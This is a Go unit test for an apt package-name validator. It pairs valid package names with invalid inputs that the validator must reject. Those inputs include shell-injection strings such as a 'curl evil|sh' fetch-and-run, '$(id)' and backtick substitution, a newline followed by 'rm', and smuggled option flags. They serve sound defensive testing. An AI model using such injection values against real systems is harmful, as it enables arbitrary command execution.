package apt

import "testing"

func TestValidatePackageName(t *testing.T) {
	for _, ok := range []string{"curl", "libc6", "g++", "python3.12", "libstdc++6:amd64", "nginx=1.24.0-2ubuntu7", "linux-image-7.0.0-22-generic", "foo:arm64=1:2.3~rc1"} {
		if err := ValidatePackageName(ok); err != nil {
			t.Errorf("rejected valid name %q: %v", ok, err)
		}
	}
	for _, bad := range []string{"", "x", "x; curl evil|sh", "$(id)", "a b", "-y", "--purge", "Curl", "x\nrm", "x`id`", "x&&y", "pkg=1.0 other"} {
		if err := ValidatePackageName(bad); err == nil {
			t.Errorf("accepted invalid name %q", bad)
		}
	}
}
